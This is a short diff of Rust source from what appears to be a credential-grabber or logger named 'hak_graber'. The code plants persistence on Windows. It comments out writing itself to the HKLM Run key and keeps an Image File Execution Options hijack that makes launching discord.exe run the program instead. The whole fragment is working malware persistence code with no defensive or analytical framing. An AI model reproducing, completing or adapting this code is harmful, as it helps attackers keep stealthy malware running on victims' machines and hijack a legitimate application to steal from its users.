@@ -17,7 +17,7 @@ pub fn execute_extra_persistence() {
     }
 
     let temp_dir_path = temp_dir_path.unwrap();
-    add_to_startup(&temp_dir_path);
+    //_add_to_startup(&temp_dir_path);
     ifeo_discord(&temp_dir_path);
 }
 
@@ -34,17 +34,12 @@ fn copy_to_temp_dir() -> Option<PathBuf> {
     Some(foreign_path)
 }
 
-fn add_to_startup(path: &PathBuf) {
+fn _add_to_startup(path: &PathBuf) {
     //add to windows->run and windows->runonce
     let run_key = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run").expect("failed to access Run key");
-    let hak_graber_res: Result<String, std::io::Error> = run_key.get_value("hak_graber");
-    if hak_graber_res.is_ok() {
-        return;
-        //we already have set path - no need to do it again
-    }
 
     let sv_result = run_key.set_value("hak_graber", &path.display().to_string());
-    if sv_result.is_err() {
+    if sv_result.is_err() { //for some reason, this part fails
         return;
         //error occured when setting reg key
     }
@@ -53,9 +48,6 @@ fn add_to_startup(path: &PathBuf) {
 }
 
 fn ifeo_discord(path: &PathBuf) {
-    //Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\discord.exe
-    //Debugger="directory/logger.exe"
-
     let ifeo_key = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\").expect("failed to access ifeo");
     let (key, disp) = ifeo_key.create_subkey("discord.exe").expect("unable to create regkey");
 
